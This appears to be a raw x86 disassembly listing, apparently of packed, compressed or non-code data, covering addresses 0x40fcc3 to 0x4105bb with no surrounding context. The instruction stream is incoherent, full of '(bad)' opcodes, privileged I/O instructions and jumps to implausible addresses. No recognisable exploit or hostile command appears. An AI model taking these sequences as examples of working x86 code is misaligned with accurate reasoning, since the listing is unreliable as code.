  40fcc3:	adc    BYTE PTR [ebx-0x5016bf42],dh
  40fcc9:	lods   al,BYTE PTR ds:[esi]
  40fcca:	fistp  DWORD PTR [esi-0x2b01895a]
  40fcd0:	or     DWORD PTR [eax],ebp
  40fcd2:	inc    ecx
  40fcd3:	jmp    0x7e8bf47a
  40fcd8:	mov    cs,WORD PTR [eax+0x768e8184]
  40fcde:	inc    BYTE PTR [ebx]
  40fce0:	cmp    eax,0xf5aefee8
  40fce5:	je     0x40fce4
  40fce7:	xchg   esp,eax
  40fce8:	sub    DWORD PTR [esi-0x2],0x752c6656
  40fcef:	add    ah,bh
  40fcf1:	je     0x40fcd9
  40fcf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fcf4:	add    esi,DWORD PTR [esi-0x2]
  40fcf7:	jo     0x40fcb1
  40fcf9:	pusha  
  40fcfa:	div    BYTE PTR [esi]
  40fcfc:	inc    esi
  40fcfd:	out    0xff,eax
  40fcff:	shl    BYTE PTR [esi+0x27e940bc],0xac
  40fd06:	fist   DWORD PTR [esi]
  40fd08:	cs jbe 0x40fd09
  40fd0b:	fsubr  QWORD PTR [ecx+0x22e94127]
  40fd11:	xor    ecx,DWORD PTR [ebx+0x0]
  40fd14:	aaa    
  40fd15:	in     eax,dx
  40fd16:	xchg   DWORD PTR [ebp-0x21ad0],eax
  40fd1c:	adc    esi,DWORD PTR [edi+0xf7ea]
	...
  40fd32:	add    BYTE PTR [eax],al
  40fd34:	addr16 in eax,dx
  40fd36:	(bad)  
  40fd37:	jae    0x40fd6c
  40fd39:	fs (bad) 
  40fd3b:	push   DWORD PTR [edi-0x56]
  40fd3e:	std    
  40fd3f:	jne    0x40fd99
  40fd41:	call   0xedc841d7
  40fd46:	std    
  40fd47:	mov    ch,0x90
  40fd49:	in     eax,0xfd
  40fd4b:	inc    DWORD PTR [edi+0x6fe8066f]
  40fd51:	mov    ah,0xfd
  40fd53:	jmp    edi
  40fd55:	mov    al,0xea
  40fd57:	not    edi
  40fd59:	jmp    0x44d7:0xe82875fd
  40fd60:	(bad)  
  40fd61:	jmp    0xfffd:0xe2b8b5fd
  40fd68:	mov    bh,0x70
  40fd6a:	push   es
  40fd6b:	call   0x3eb13b
  40fd70:	xchg   DWORD PTR [eax-0x1598081e],esi
  40fd76:	std    
  40fd77:	jne    0x40fd61
  40fd79:	out    0xbb,eax
  40fd7b:	inc    esp
  40fd7c:	xchg   edx,ebp
  40fd7e:	std    
  40fd7f:	mov    ch,0x70
  40fd81:	loop   0x40fd80
  40fd83:	inc    DWORD PTR [edi-0x5817f990]
  40fd89:	mov    bl,0xfd
  40fd8b:	inc    DWORD PTR [edi]
  40fd8d:	mov    al,0xda
  40fd8f:	test   DWORD PTR [edi],0x9875fdea
  40fd95:	out    0x7e,eax
  40fd97:	inc    BYTE PTR [eax]
	...
  40fda9:	add    BYTE PTR [eax],al
  40fdab:	add    BYTE PTR [edi-0x16],dl
  40fdae:	std    
  40fdaf:	mov    ch,0x64
  40fdb1:	loop   0x40fdb0
  40fdb3:	(bad)  
  40fdb4:	cmp    DWORD PTR [ecx],eax
  40fdb6:	stos   BYTE PTR es:[edi],al
  40fdb7:	inc    esi
  40fdb8:	xchg   esi,eax
  40fdb9:	add    dh,BYTE PTR [esi-0x4c]
  40fdbc:	mov    DWORD PTR [edx+0x74],esi
  40fdbf:	(bad)  
  40fdc0:	xchg   ecx,eax
  40fdc1:	leave  
  40fdc2:	mov    ebp,0xae6a7efe
  40fdc7:	jmp    0x40fe37
  40fdc9:	bound  esi,QWORD PTR [edi+eiz*8-0x3c]
  40fdcd:	and    dh,BYTE PTR [ebp-0x2]
  40fdd0:	data16 mov WORD PTR [ebx-0xa],gs
  40fdd4:	pop    esi
  40fdd5:	dec    edx
  40fdd6:	imul   ecx,DWORD PTR [ecx-0x18bbe02],0xffffff84
  40fddd:	inc    ebp
  40fdde:	ins    BYTE PTR es:[edi],dx
  40fddf:	inc    BYTE PTR [esi+0x51]
  40fde2:	hlt    
  40fde3:	inc    esi
  40fde4:	ds stos BYTE PTR es:[edi],al
  40fde6:	je     0x40fd9c
  40fde8:	sbb    DWORD PTR [edx+0x1521fe74],ebp
  40fdee:	mov    ebp,0xbe9226fe
  40fdf3:	not    DWORD PTR [eax]
  40fdf5:	or     DWORD PTR [esi-0x2],esi
  40fdf8:	push   ss
  40fdf9:	sub    dh,0xfb
  40fdfc:	and    DWORD PTR [ebx-0x4fc6ffe6],edi
  40fe02:	inc    ecx
  40fe03:	pop    es
  40fe04:	cmp    DWORD PTR [ecx+ecx*4],edx
  40fe07:	jmp    0x40fdc3
  40fe09:	pushf  
  40fe0a:	ja     0x40fe75
  40fe0c:	cmp    DWORD PTR [edi-0x37],ecx
  40fe0f:	inc    BYTE PTR [eax]
	...
  40fe21:	add    BYTE PTR [eax],al
  40fe23:	add    BYTE PTR [ecx+esi*2+0x6a],ch
  40fe27:	test   DWORD PTR [ebp-0x36],esi
  40fe2a:	je     0x40fdb4
  40fe2c:	jl     0x40fdf3
  40fe2e:	jmp    0x40fe00
  40fe30:	jbe    0x40fdda
  40fe32:	add    bh,bh
  40fe34:	dec    esp
  40fe35:	jno    0x40fea1
  40fe37:	pop    es
  40fe38:	mov    edi,0x2cfe7529
  40fe3d:	and    eax,0x417475
  40fe42:	adc    DWORD PTR [ebx+0x4b1d72fa],esi
  40fe48:	js     0x40fe45
  40fe4a:	call   0x69a4c21d
  40fe4f:	inc    eax
  40fe50:	mov    dh,BYTE PTR [edx+0x7b]
  40fe53:	pop    es
  40fe54:	xchg   ecx,eax
  40fe55:	sbb    al,0xe1
  40fe57:	add    edi,DWORD PTR [ecx]
  40fe59:	pop    es
  40fe5a:	sub    edi,ebp
  40fe5c:	cmp    cl,BYTE PTR [ecx+0x2a]
  40fe5f:	or     BYTE PTR [ecx],bh
  40fe61:	jae    0x40febe
  40fe63:	adc    al,0x51
  40fe65:	or     al,0x1
  40fe67:	add    al,0x39
  40fe69:	pop    es
  40fe6a:	test   eax,0xaa493aee
  40fe6f:	pop    es
  40fe70:	cmp    DWORD PTR [ecx-0x13b883d5],ecx
  40fe76:	shr    BYTE PTR [ebx+0x25],0xbb
  40fe7a:	mov    ch,0x74
  40fe7c:	sar    DWORD PTR [ebx+0x74a574ac],0xa5
  40fe83:	out    dx,al
  40fe84:	cs jb  0x40fe9a
  40fe87:	adc    al,0x0
	...
  40fe99:	add    BYTE PTR [eax],al
  40fe9b:	add    BYTE PTR [ecx],dl
  40fe9d:	inc    ebx
  40fe9e:	cmp    dh,BYTE PTR [ebp+0x17]
  40fea1:	push   es
  40fea2:	test   eax,0x2b8753ef
  40fea7:	jo     0x40fe39
  40fea9:	add    BYTE PTR [esi+edi*4+0xa],ch
  40fead:	shl    DWORD PTR [ebp-0x12],1
  40feb0:	repnz push 0x71efe7ba
  40feb6:	icebp  
  40feb7:	inc    ebx
  40feb8:	push   0x1a
  40feba:	rol    DWORD PTR [ebx],1
  40febc:	dec    ecx
  40febd:	popa   
  40febe:	xchg   esi,eax
  40febf:	je     0x40ff0e
  40fec1:	or     BYTE PTR [ecx-0x2d],al
  40fec4:	jnp    0x40ff37
  40fec6:	inc    ebp
  40fec7:	je     0x40ff16
  40fec9:	add    al,0x3e
  40fecb:	out    dx,al
  40fecc:	ss push 0x72798dff
  40fed2:	(bad)  
  40fed3:	cs lahf 
  40fed5:	ins    DWORD PTR es:[edi],dx
  40fed6:	(bad)  
  40fed7:	pushf  
  40fed8:	cs jb  0x40ff4f
  40fedb:	icebp  
  40fedc:	adc    ah,ah
  40fede:	inc    edx
  40fedf:	push   ss
  40fee0:	or     eax,0x220d7472
  40fee5:	fwait
  40fee6:	inc    ebp
  40fee7:	push   es
  40fee8:	or     eax,0x3aedc148
  40feed:	retf   
  40feee:	mov    al,BYTE PTR ds:0x97d33db9
  40fef4:	in     eax,0xeb
  40fef6:	or     edx,ecx
  40fef8:	push   edx
  40fef9:	(bad)  
  40fefa:	(bad)  
  40fefb:	ficomp WORD PTR [esi-0x4f]
  40fefe:	je     0x40feec
	...
  40ff14:	push   0x3addc148
  40ff19:	add    DWORD PTR [ecx+edi*4+0x6d],0x72
  40ff1e:	je     0x40ff0d
  40ff20:	loop   0x40ff39
  40ff22:	dec    esp
  40ff23:	mov    dh,0xaa
  40ff25:	push   es
  40ff26:	rcr    dh,0xb6
  40ff29:	push   eax
  40ff2a:	(bad)  
  40ff2b:	call   0x9db5706a
  40ff30:	jge    0x40ffae
  40ff32:	inc    ebp
  40ff33:	xchg   esi,eax
  40ff34:	mov    cl,BYTE PTR [eax-0x137582bc]
  40ff3a:	sti    
  40ff3b:	xchg   BYTE PTR [eax],al
  40ff3d:	gs (bad) 
  40ff3f:	hlt    
  40ff40:	xchg   edx,eax
  40ff41:	pop    ecx
  40ff42:	stos   BYTE PTR es:[edi],al
  40ff43:	das    
  40ff44:	push   0x72
  40ff46:	mov    dh,ah
  40ff48:	mov    gs,WORD PTR [eax-0x5e]
  40ff4b:	jmp    0xda8ff8a
  40ff50:	popf   
  40ff51:	mov    edi,0x6972beff
  40ff56:	pop    ss
  40ff57:	jmp    0x1010496
  40ff5c:	test   DWORD PTR [edi],eax
  40ff5e:	jmp    0x3dcffb
  40ff63:	mov    dh,BYTE PTR [eax+0x54]
  40ff66:	sub    cl,BYTE PTR [eax-0x1f]
  40ff69:	cld    
  40ff6a:	out    0x39,eax
  40ff6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff6d:	cld    
  40ff6e:	inc    DWORD PTR [edx]
  40ff70:	inc    eax
  40ff71:	repz jae 0x40ff5c
  40ff74:	mov    eax,0x414820
	...
  40ff89:	add    BYTE PTR [eax],al
  40ff8b:	add    BYTE PTR [eax-0x672c19aa],ah
  40ff91:	cld    
  40ff92:	dec    DWORD PTR [edx]
  40ff94:	push   eax
  40ff95:	ja     0x40ff97
  40ff97:	jmp    0x40ff8f
  40ff99:	repnz push cs
  40ff9b:	mov    ch,al
  40ff9d:	fld    DWORD PTR [edi+0x3c547445]
  40ffa3:	dec    eax
  40ffa4:	adc    esp,edi
  40ffa6:	push   ebp
  40ffa7:	call   0x410456
  40ffac:	pop    ebx
  40ffad:	mov    esp,0x4f6b0273
  40ffb2:	mov    eax,esi
  40ffb4:	call   0x208247e6
  40ffb9:	int3   
  40ffba:	cld    
  40ffbb:	push   ss
  40ffbc:	and    BYTE PTR [ebx+eax*1],al
  40ffbf:	lock test eax,0xfc68da68
  40ffc5:	stos   DWORD PTR es:[edi],eax
  40ffc6:	aas    
  40ffc7:	add    BYTE PTR [esi-0x34],dl
  40ffca:	xchg   esi,eax
  40ffcb:	sbb    BYTE PTR [eax],ah
  40ffcd:	add    al,0xb
  40ffcf:	rol    BYTE PTR ds:0x8a3beb06,0x13
  40ffd6:	mov    BYTE PTR [ebp-0x29],dl
  40ffd9:	in     al,dx
  40ffda:	inc    ebx
  40ffdb:	fcomp  DWORD PTR [ebx+0x38]
  40ffde:	loop   0x40ffa6
  40ffe0:	rol    BYTE PTR [ebx],1
  40ffe2:	mov    eax,DWORD PTR [ebp+0x78]
  40ffe5:	mov    ecx,0xd639fffe
  40ffea:	neg    ebx
  40ffec:	into   
  40ffed:	push   esp
  40ffee:	pop    edx
  40ffef:	inc    BYTE PTR [eax]
	...
  410001:	add    BYTE PTR [eax],al
  410003:	add    BYTE PTR [ecx+esi*2+0x5a],cl
  410007:	xchg   edx,eax
  410008:	mov    edi,0xc89722e
  41000d:	mov    edx,0xe195447d
  410012:	adc    cl,BYTE PTR [edx+0x447e2e0c]
  410018:	xor    ecx,0x59578012
  41001e:	add    DWORD PTR [ebp-0x18e021b],eax
  410024:	xchg   ah,ch
  410026:	pop    esi
  410027:	out    0xd8,eax
  410029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41002a:	jno    0x41002a
  41002c:	les    ebx,FWORD PTR [edx+esi*2-0x41d99eb1]
  410033:	(bad)  
  410034:	push   dx
  410036:	add    ebx,DWORD PTR [esi+0x70]
  410039:	fwait
  41003a:	(bad)  
  41003b:	(bad)  
  41003c:	in     al,dx
  41003d:	loope  0x41009e
  41003f:	inc    ah
  410041:	dec    esp
  410042:	pop    edx
  410043:	aam    0xf0
  410045:	inc    ebp
  410046:	jo     0x410052
  410048:	jns    0x41007f
  41004a:	sbb    ebp,DWORD PTR [eax+0x46]
  41004d:	and    ebx,eax
  41004f:	(bad)  
  410050:	jle    0x410093
  410052:	fisttp QWORD PTR [eax+0x26]
  410055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410056:	shl    DWORD PTR [edi+0x2f],cl
  410059:	stos   DWORD PTR es:[edi],eax
  41005a:	ret    
  41005b:	call   FWORD PTR [esi-0x3010fda7]
  410061:	add    BYTE PTR [eax+ecx*2],ah
  410064:	js     0x4100bf
  410066:	sar    dh,cl
	...
  41007c:	test   BYTE PTR [ecx+0x5a],dh
  41007f:	and    DWORD PTR [ecx-0xa],0x2490e770
  410086:	jno    0x410086
  410088:	lock jmp FWORD PTR [edx]
  41008b:	cld    
  41008c:	(bad)  
  41008e:	jno    0x4100f0
  410090:	mov    ebx,0xcede5443
  410095:	fsub   DWORD PTR [edx+0x50f84d70]
  41009b:	in     eax,dx
  41009c:	js     0x41010d
  41009e:	cmp    eax,0xc26bfd7b
  4100a3:	or     eax,0x5be0f4ae
  4100a8:	(bad)  [esi+0x25]
  4100ab:	jno    0x4100bd
  4100ad:	and    ebx,DWORD PTR [esi]
  4100af:	idiv   DWORD PTR [esi]
  4100b1:	pop    eax
  4100b2:	jno    0x410125
  4100b4:	(bad)  
  4100b5:	outs   dx,BYTE PTR ds:[esi]
  4100b6:	or     BYTE PTR [edi],0x86
  4100b9:	hlt    
  4100ba:	lock pop ebx
  4100bc:	test   eax,0xde70fd6e
  4100c1:	(bad)  
  4100c2:	call   0xd318ad27
  4100c7:	mov    ebx,0x150fff9
  4100cc:	icebp  
  4100cd:	shr    al,0x70
  4100d0:	int    0xf7
  4100d2:	shl    BYTE PTR [esi],0xe3
  4100d5:	outs   dx,BYTE PTR ds:[esi]
  4100d6:	int    0x70
  4100d8:	int    0x6b
  4100da:	(bad)
  4100dd:	pop    eax
  4100de:	mov    BYTE PTR ds:[eax],0x0
	...
  4100f2:	add    BYTE PTR [eax],al
  4100f4:	aaa    
  4100f5:	outs   dx,BYTE PTR ds:[esi]
  4100f6:	lahf   
  4100f7:	inc    ebp
  4100f8:	cmp    al,BYTE PTR [eax]
  4100fa:	adc    al,0x7d
  4100fc:	adc    al,BYTE PTR [eax+0x6e274bac]
  410102:	popf   
  410103:	jle    0x410182
  410105:	ins    BYTE PTR es:[edi],dx
  410106:	cmp    BYTE PTR [ecx-0x7b],dh
  410109:	cld    
  41010a:	(bad)  
  41010b:	idiv   BYTE PTR [esi]
  41010d:	pop    eax
  41010e:	sub    al,0x19
  410110:	cmp    DWORD PTR [eax],eax
  410112:	repnz inc ebx
  410114:	inc    edi
  410115:	cmp    edi,0xffffffa8
  410118:	cmp    eax,DWORD PTR [eax]
  41011a:	add    BYTE PTR [esi-0x17008a01],ah
  410120:	cmp    al,BYTE PTR [eax]
  410122:	(bad)  
  410123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410124:	dec    esi
  410125:	outs   dx,BYTE PTR ds:[esi]
  410126:	push   es
  410127:	jmp    0xc340db66
  41012c:	cmp    bl,dl
  41012e:	call   edx
  410130:	cmp    bh,BYTE PTR [ebx+0x44]
  410133:	xor    eax,0x3d847c8a
  410138:	xor    DWORD PTR [esi-0x2],ebp
  41013b:	cdq    
  41013c:	sub    esp,esi
  41013e:	mul    DWORD PTR [esi]
  410140:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410141:	imul   esp,edi,0x31f7
  410147:	loop   0x410143
  410149:	lock add al,0x0
  41014c:	mov    ebp,0x62e90000
  410151:	arpl   WORD PTR [edi],sp
  410153:	test   al,0x3a
  410155:	ins    DWORD PTR es:[edi],dx
  410156:	je     0x41013d
	...
  41016c:	adc    ch,BYTE PTR [eax]
  41016e:	dec    eax
  41016f:	out    dx,al
  410170:	(bad)  
  410171:	mov    esp,0x84b8b98a
  410176:	repz (bad) 
  410178:	out    0x6d,al
  41017a:	dec    edi
  41017b:	cmp    ebp,ebp
  41017d:	pop    ss
  41017e:	dec    eax
  41017f:	into   
  410180:	(bad)  
  410181:	ja     0x410107
  410183:	mov    eax,ds:0xd1fe6dc6
  410188:	es sar esi,0xb6
  41018c:	adc    ebp,DWORD PTR [ebp+0x66]
  41018f:	inc    ebx
  410190:	in     eax,0xbf
  410192:	jmp    DWORD PTR [ebp-0x6109ab20]
  410198:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410199:	outs   dx,BYTE PTR ds:[esi]
  41019a:	je     0x41017d
  41019c:	jb     0x41021d
  41019e:	inc    esi
  41019f:	mov    ss,WORD PTR [esi-0x7fff7b88]
  4101a5:	cmc    
  4101a6:	std    
  4101a7:	dec    DWORD PTR [edx+0x4]
  4101aa:	push   0xfe431873
  4101af:	(bad)  
  4101b0:	sub    eax,0x57fff5bc
  4101b5:	fnsave [ebx+0x8]
  4101b8:	push   0x67ff4565
  4101bd:	jmp    0x410142
  4101bf:	in     al,dx
  4101c0:	outs   dx,DWORD PTR ds:[esi]
  4101c1:	(bad)  
  4101c3:	push   0xffffffd0
  4101c5:	dec    eax
  4101c6:	jp     0x410210
  4101c8:	loope  0x4101ca
  4101ca:	push   DWORD PTR [ebp-0x20ab8]
	...
  4101e4:	push   edi
  4101e5:	addr16 push es
  4101e7:	call   0x3e47d0
  4101ec:	or     DWORD PTR [edi-0x1a],esi
  4101ef:	mul    DWORD PTR [edi]
  4101f1:	fisttp QWORD PTR [ebx-0x20aab7b]
  4101f7:	jmp    DWORD PTR [eax-0x5eb77cb8]
  4101fd:	add    bh,bh
  4101ff:	mov    ch,0x48
  410201:	cmc    
  410202:	std    
  410203:	call   DWORD PTR [edi+0x67]
  410206:	push   es
  410207:	call   0x3e4750
  41020c:	leave  
  41020d:	ja     0x4101f1
  41020f:	mul    DWORD PTR [edi-0x23]
  410212:	push   0x4693f800
  410217:	inc    ecx
  410218:	push   eax
  410219:	fnsave [ebx-0x2251028]
  41021f:	jmp    FWORD PTR [ebp+0x6c]
  410222:	out    0x11,al
  410224:	pop    edi
  410225:	(bad)  
  410227:	mov    DWORD PTR [ebp-0x48000a21],ecx
  41022d:	jle    0x4101ea
  41022f:	lock cmp DWORD PTR [edx+0x1539fe6d],ecx
  410236:	fild   DWORD PTR [edx-0x18a6a44]
  41023c:	neg    BYTE PTR [ecx-0xa]
  41023f:	popa   
  410240:	mov    edx,0xe6f65b34
  410245:	fiadd  DWORD PTR [edx]
  410247:	je     0x410249
	...
  410259:	add    BYTE PTR [eax],al
  41025b:	add    BYTE PTR [eax-0x19fffdaf],al
  410261:	mov    ebp,DWORD PTR [ebp+0x74]
  410264:	sub    ecx,eax
  410266:	(bad)  
  410267:	aas    
  410268:	(bad)  
  410269:	mov    edx,0x2ac9b46d
  41026e:	outs   dx,BYTE PTR ds:[esi]
  41026f:	(bad)  
  410270:	mov    dh,0xb4
  410272:	adc    ch,al
  410274:	loope  0x41020f
  410276:	ins    DWORD PTR es:[edi],dx
  410277:	(bad)  
  410278:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410279:	hlt    
  41027a:	pop    esi
  41027b:	neg    BYTE PTR [esi+0x29746e22]
  410281:	adc    DWORD PTR [ecx+0x6e128e3f],ecx
  410287:	mov    ah,0x91
  410289:	adc    ch,BYTE PTR [esi-0x2]
  41028c:	jle    0x41027a
  41028e:	adc    ch,al
  410290:	lds    ebx,FWORD PTR [ecx+0x2c6efe6d]
  410296:	dec    edi
  410297:	mul    BYTE PTR [esi+0x5a]
  41029a:	ins    BYTE PTR es:[edi],dx
  41029b:	mov    ah,0x55
  41029d:	dec    edx
  41029e:	ins    BYTE PTR es:[edi],dx
  41029f:	(bad)  
  4102a0:	push   esi
  4102a1:	aam    0x13
  4102a3:	call   0xfeae1ba5
  4102a8:	inc    esi
  4102a9:	xchg   esp,eax
  4102aa:	arpl   si,si
  4102ac:	ds inc edx
  4102ae:	ins    BYTE PTR es:[edi],dx
  4102af:	je     0x4102fa
  4102b1:	push   ecx
  4102b2:	fnstcw WORD PTR [edi]
  4102b4:	cs mov dl,0x6c
  4102b7:	je     0x410302
  4102b9:	call   0x6da6:0x26d7b6
	...
  4102d4:	pop    ss
  4102d5:	cmc    
  4102d6:	lock pop ebx
  4102d8:	mov    BYTE PTR [edx-0x6b],ch
  4102db:	ins    DWORD PTR es:[edi],dx
  4102dc:	pop    es
  4102dd:	mov    ch,0xb0
  4102df:	jne    0x4102e0
  4102e1:	push   0xffffff90
  4102e3:	loope  0x410360
  4102e5:	imul   edi,DWORD PTR [ebp+0x6d],0xffffffa5
  4102e9:	outs   dx,DWORD PTR ds:[esi]
  4102ea:	jge    0x410359
  4102ec:	out    0x57,eax
  4102ee:	adc    cl,al
  4102f0:	fild   QWORD PTR [edx+0x65]
  4102f3:	mov    bh,0xe2
  4102f5:	jb     0x410354
  4102f7:	ins    DWORD PTR es:[edi],dx
  4102f8:	(bad)  
  4102f9:	mov    esp,0x6ac76ca9
  4102fe:	xchg   ebx,eax
  4102ff:	pop    esp
  410300:	(bad)  
  410301:	push   0x45
  410303:	pop    esp
  410304:	clc    
  410305:	mov    esi,0xb4af6d3d
  41030a:	dec    esp
  41030b:	jne    0x4102b4
  41030d:	push   0x40
  41030f:	xor    eax,0x6d256afa
  410314:	int    0x5f
  410316:	adc    eax,0xc4578f6d
  41031b:	rol    BYTE PTR [edi-0x7938f296],0x58
  410322:	mov    ch,0x6d
  410324:	ja     0x410390
  410326:	std    
  410327:	div    BYTE PTR [edx+0x57]
  41032a:	jle    0x410342
  41032c:	cmp    DWORD PTR [eax],eax
  41032e:	and    BYTE PTR [edx+0x32],al
  410331:	add    BYTE PTR [ecx+edi*2],bh
  410334:	bound  edi,QWORD PTR [esi-0x5c]
  410337:	outs   dx,DWORD PTR ds:[esi]
	...
  41034c:	loopne 0x41034d
  41034e:	inc    edx
  41034f:	mov    ecx,0x5be0f447
  410354:	cld    
  410355:	mov    edi,0xc3c16cc5
  41035a:	mov    esp,0xfff8a56c
  41035f:	inc    eax
  410360:	inc    ecx
  410362:	inc    eax
  410363:	jmp    0xd0b637f5
  410368:	sti    
  410369:	imul   esp,esi,0xfe6a9f95
  41036f:	xchg   esi,eax
  410370:	lar    ebp,WORD PTR [eax+0x27]
  410374:	mov    ebp,0x3b10ffc0
  410379:	add    BYTE PTR [eax],al
  41037b:	imul   edx,DWORD PTR [edx+0x5576fc5f],0x4d6d746a
  410385:	hlt    
  410386:	pop    es
  410387:	push   ecx
  410388:	jmp    0x4103b3
  41038a:	call   FWORD PTR [esi+0x13]
  41038d:	aas    
  41038e:	add    ebp,ecx
  410390:	out    dx,eax
  410391:	jbe    0x41037e
  410393:	push   0x76
  410395:	gs imul ebp,ecx,0xb4feb590
  41039c:	mov    dl,0x61
  41039e:	hlt    
  41039f:	not    BYTE PTR ds:0xea4886a
  4103a5:	loope  0x4103a6
  4103a7:	call   0x7ca8aea1
  4103ac:	rol    al,cl
  4103ae:	inc    DWORD PTR [eax+0x0]
	...
  4103c4:	mov    ds:0xde940c1,al
  4103c9:	hlt    
  4103ca:	pop    es
  4103cb:	adc    DWORD PTR [edi-0x1d01011e],esp
  4103d1:	repz sti 
  4103d3:	imul   BYTE PTR [ecx+eax*1-0x18]
  4103d7:	xlat   BYTE PTR ds:[ebx]
  4103d8:	jp     0x410444
  4103da:	(bad)  
  4103db:	mov    al,0xff
  4103dd:	cld    
  4103de:	push   DWORD PTR [ebx]
  4103e0:	into   
  4103e1:	push   esp
  4103e2:	sub    BYTE PTR [ebp-0x31018e13],0xc0
  4103e9:	ret    
  4103ea:	sti    
  4103eb:	add    BYTE PTR [eax-0x2b],dl
  4103ee:	jae    0x4103fc
  4103f0:	out    dx,eax
  4103f1:	outs   dx,BYTE PTR ds:[esi]
  4103f2:	push   es
  4103f3:	call   0x4113c4
  4103f8:	sbb    edi,DWORD PTR [ebp+0x315850d]
  4103fe:	add    BYTE PTR [eax],al
  410400:	xlat   BYTE PTR ds:[ebx]
  410401:	test   BYTE PTR ds:[eax],0x10
  410405:	std    
  410406:	inc    esi
  410408:	push   ebp
  410409:	lock std 
  41040b:	pop    es
  41040c:	loopne 0x41040a
  41040e:	imul   eax,DWORD PTR [eax],0x6a044a
  410414:	cmp    al,BYTE PTR [ecx*4-0x74ab9bbb]
  41041b:	test   DWORD PTR [ebp+ebp*8-0x3],esi
  41041f:	call   DWORD PTR [eax+0x6ff873d5]
  410425:	outs   dx,DWORD PTR ds:[esi]
  410426:	cli    
  410427:	call   0x41042c
	...
  41043c:	adc    BYTE PTR ds:[eax],al
  41043f:	add    BYTE PTR [ebx+0x90572bc],ch
  410445:	mov    esp,0x4490ffff
  41044a:	in     al,0x28
  41044c:	sar    esp,1
  41044e:	(bad)  
  41044f:	jne    0x4103dd
  410451:	(bad)  
  410452:	iret   
  410453:	inc    ebp
  410454:	das    
  410455:	aad    0x4e
  410457:	mov    eax,DWORD PTR [eax-0x19]
  41045a:	xor    esp,0x27
  41045d:	aad    0xfd
  41045f:	push   eax
  410460:	rol    ah,cl
  410462:	mov    edi,0x87d56f45
  410467:	test   DWORD PTR [eax-0x13],ecx
  41046a:	std    
  41046b:	(bad)  
  41046c:	cmp    BYTE PTR ds:0x4a5fff42,cl
  410472:	(bad)  
  410473:	addr16 lahf 
  410475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410476:	aas    
  410477:	add    BYTE PTR [ecx],bh
  410479:	push   edx
  41047a:	scas   eax,DWORD PTR es:[edi]
  41047b:	xlat   BYTE PTR ds:[ebx]
  41047c:	inc    esi
  41047d:	cmp    DWORD PTR [ecx-0x2],ebp
  410480:	lods   al,BYTE PTR ds:[esi]
  410481:	jno    0x4104dd
  410483:	sbb    DWORD PTR [esi+eiz*4+0x69],esi
  410487:	mov    BYTE PTR [ecx+ebp*4-0x3be1018f],bh
  41048e:	add    ebp,DWORD PTR [eax+0x1f]
  410491:	xor    al,ch
  410493:	dec    DWORD PTR [edi]
  410495:	int    0x4a
  410497:	test   BYTE PTR [esi],0x8f
  41049a:	imul   esi,DWORD PTR [ecx+esi*1-0x7f],0x4369
	...
  4104b2:	add    BYTE PTR [eax],al
  4104b4:	idiv   BYTE PTR [esi+0x7b]
  4104b7:	test   ch,bl
  4104b9:	out    dx,al
  4104ba:	imul   edi,esi,0xfada5953
  4104c0:	jno    0x4104da
  4104c2:	add    al,0xff
  4104c4:	mov    ecx,es
  4104c6:	jno    0x4104c6
  4104c8:	into   
  4104c9:	(bad)  
  4104ca:	out    dx,eax
  4104cb:	pop    es
  4104cc:	shl    DWORD PTR [ebp-0x1f410142],1
  4104d2:	jg     0x4104bb
  4104d4:	scas   al,BYTE PTR es:[edi]
  4104d5:	mov    esi,0x5b48c69
  4104da:	jb     0x4104da
  4104dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104dd:	mov    edx,ebx
  4104df:	adc    esi,eax
  4104e1:	xchg   edi,eax
  4104e2:	add    bh,bh
  4104e4:	int3   
  4104e5:	shl    DWORD PTR [ecx-0x2],0x8e
  4104e9:	push   es
  4104ea:	lock pop es
  4104ec:	xchg   ecx,eax
  4104ed:	adc    eax,0xe07efebf
  4104f2:	jg     0x4104d7
  4104f4:	outs   dx,BYTE PTR ds:[esi]
  4104f5:	(bad)  
  4104f6:	imul   ebp,DWORD PTR [ecx+0x39],0xf8491b91
  4104fd:	pop    eax
  4104fe:	imul   esi,DWORD PTR [ecx+eax*4+0x56fe686e],0x56fc5c00
  410509:	cdq    
  41050a:	and    al,0x69
  41050c:	inc    edi
  41050d:	jns    0x41057a
  41050f:	fs inc edi
  410511:	addr16 int 0x77
  410514:	mov    ebp,0x69bd4f
	...
  410529:	add    BYTE PTR [eax],al
  41052b:	add    BYTE PTR [edi],ch
  41052d:	rcl    BYTE PTR [eax-0x3d],1
  410530:	jno    0x4104f3
  410532:	call   0xb588ea9f
  410537:	imul   edx,DWORD PTR [edi],0x16fc1b67
  41053d:	jns    0x410563
  41053f:	imul   eax,DWORD PTR [edi],0x7506b79
  410545:	lea    eax,[di+0x6fb5]
  41054a:	jge    0x4105b5
  41054c:	out    dx,eax
  41054d:	push   esp
  41054f:	fdivr  QWORD PTR [ebx-0x208e7b5c]
  410555:	callw  0x5e48
  410559:	and    DWORD PTR [ebx+0x5d66c75c],0x4
  410560:	dec    ebp
  410561:	leave  
  410562:	rol    BYTE PTR [ebx],0x39
  410565:	push   edi
  410566:	mov    gs,WORD PTR [ecx+0x2d]
  410569:	adc    BYTE PTR [ecx+0x38],dl
  41056c:	ins    DWORD PTR es:[edi],dx
  41056d:	addr16 cmp eax,0x3d6fed69
  410573:	imul   ebx,DWORD PTR [edi-0x5eec4c9a],0x8f68e71f
  41057d:	push   bx
  41057f:	pop    eax
  410580:	(bad)  
  410581:	adc    ax,0x569
  410585:	adc    BYTE PTR [ecx],al
  410587:	push   ss
  410588:	aaa    
  410589:	addr16 add eax,0xf557a569
  41058f:	push   0x0
	...
  4105a4:	addr16 data16 (bad) 
  4105a7:	jnp    0x4105f3
  4105a9:	pop    eax
  4105aa:	add    ebp,DWORD PTR [edi-0x63019a1f]
  4105b0:	imul   BYTE PTR [ebp-0x2]
  4105b3:	(bad)  
  4105b5:	stos   DWORD PTR es:[edi],eax
  4105b6:	jecxz  0x410596
  4105b8:	shl    DWORD PTR [ebp-0x2],1
  4105bb:	push   esp
